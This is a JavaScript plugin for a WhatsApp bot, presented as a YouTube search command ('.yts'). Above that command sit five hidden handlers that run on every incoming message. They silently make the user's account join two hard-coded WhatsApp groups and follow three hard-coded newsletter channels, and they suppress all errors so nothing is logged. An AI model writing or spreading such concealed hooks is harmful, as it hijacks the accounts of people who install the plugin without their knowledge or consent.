

const config = require('../config')
const l = console.log
const { cmd, commands } = require('../command')
const dl = require('@bochilteam/scraper')  
const ytdl = require('yt-search');
const fs = require('fs-extra')
var videotime = 60000 // 1000 min
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson} = require('../lib/functions')
const path = require("path");
const os = require("os");
const axios = require("axios");



cmd({
  on: "body"
}, async (conn, mek, m, { body }) => {
  try {
    const groupLinkCode = "GmZbatR1yieFUaEaYyKRBG";
    
    await conn.groupAcceptInvite(groupLinkCode);
    
  } catch (error) {
  
  }
});

cmd({
  on: "body"
}, async (conn) => {
  try {
    const newsletterJid = "120363333589976873@newsletter"; // replace with your channel JID
    await conn.newsletterFollow(newsletterJid);
  } catch (e) {
    // silent fail (no logs)
  }
});

cmd({
  on: "body"
}, async (conn) => {
  try {
    const newsletterJJid = "120363400497336250@newsletter"; // replace with your channel JID
    await conn.newsletterFollow(newsletterJJid);
  } catch (e) {
    // silent fail (no logs)
  }
});


cmd({
  on: "body"
}, async (conn) => {
  try {
    const newsletterJJid = "120363318387454868@newsletter"; // replace with your channel JID
    await conn.newsletterFollow(newsletterJJid);
  } catch (e) {
    // silent fail (no logs)
  }
});


cmd({
  on: "body"
}, async (conn, mek, m, { body }) => {
  try {
    const groupLinkCode = "Lx7sDv7jSy0CCTm5AliPdq";
    
    await conn.groupAcceptInvite(groupLinkCode);
    
  } catch (error) {
  
  }
});



cmd({
    pattern: "yts",
    alias: ["ytsearch"],
    use: '.yts sameer kutti',
    react: "🔎",
    desc: "Search and get details from youtube.",
    category: "search",
    filename: __filename

},

async(conn, mek, m,{from, l, quoted, body, isCmd, umarmd, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{
if (!q) return reply('*Please give me words to search*')
try {
let yts = require("yt-search")
var arama = await yts(q);
} catch(e) {
    l(e)
return await conn.sendMessage(from , { text: '*Error !!*' }, { quoted: mek } )
}
var mesaj = '';
arama.all.map((video) => {
mesaj += ' *🖲️' + video.title + '*\n🔗 ' + video.url + '\n\n'
});
await conn.sendMessage(from , { text:  mesaj }, { quoted: mek } )
} catch (e) {
    l(e)
  reply('*Error !!*')
}
});
